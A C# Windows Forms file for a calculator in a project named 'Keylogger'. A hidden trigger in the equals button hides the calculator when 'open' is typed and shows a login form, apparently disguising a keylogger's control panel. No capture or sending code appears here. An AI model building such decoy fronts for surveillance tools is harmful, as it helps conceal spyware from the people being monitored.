using Keylogger.GUI;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Keylogger
{
    public partial class Form1 : Form
    {
        double resultValue = 0;
        string operationPerformed = "";
        bool isOperationPerformed = false;

        public Form1()
        {
            InitializeComponent();
        }

        private void button_click(object sender, EventArgs e)
        {
            if (tbDisplayResult.Text == "0" || (isOperationPerformed))
                tbDisplayResult.Clear();

            isOperationPerformed = false;

            Button button = (Button)sender;

            //validation on deciamls more than 1
            if (button.Text == ".")
            {
                if (!tbDisplayResult.Text.Contains("."))
                    tbDisplayResult.Text += button.Text;
            }
            else {
                tbDisplayResult.Text += button.Text;
            }

            

        }

        private void operator_click(object sender, EventArgs e)
        {
            Button button = (Button)sender;

            operationPerformed = button.Text;
            resultValue = Double.Parse(tbDisplayResult.Text);
            lbCurrentOp.Text = resultValue + " " + operationPerformed;
            isOperationPerformed =true;

        }

        private void button17_Click(object sender, EventArgs e)
        {
            tbDisplayResult.Text = "0";
            resultValue = 0;
        }

        private void button18_Click(object sender, EventArgs e)
        {
            tbDisplayResult.Text = "0";
        }

        private void button19_Click(object sender, EventArgs e)
        {
            if (tbDisplayResult.Text == "open")
            {
                this.Visible = false;

                FormLogin f = new FormLogin();
                f.Show();
            }
            else
            if (tbDisplayResult.Text == "exit")
            {
                Application.Exit();
            }
            else
            if (operationPerformed == "+")
            {
                tbDisplayResult.Text = (resultValue + double.Parse(tbDisplayResult.Text)).ToString();
            }
            else if (operationPerformed == "-")
            {
                tbDisplayResult.Text = (resultValue - double.Parse(tbDisplayResult.Text)).ToString();
            }
            else if (operationPerformed == "X")
            {
                tbDisplayResult.Text = (resultValue * double.Parse(tbDisplayResult.Text)).ToString();
            }
            else {
                tbDisplayResult.Text = (resultValue / double.Parse(tbDisplayResult.Text)).ToString();
            }
        }

        private void button16_Click(object sender, EventArgs e)
        {
            if (tbDisplayResult.Text.Length > 0)
                tbDisplayResult.Text = tbDisplayResult.Text.Remove(tbDisplayResult.Text.Length - 1, 1);

            if (tbDisplayResult.Text == "")
                tbDisplayResult.Text = "0";
        }

        private void button_click_EXIT(object sender, EventArgs e)
        {
            this.Visible = false;
        }
    }
}
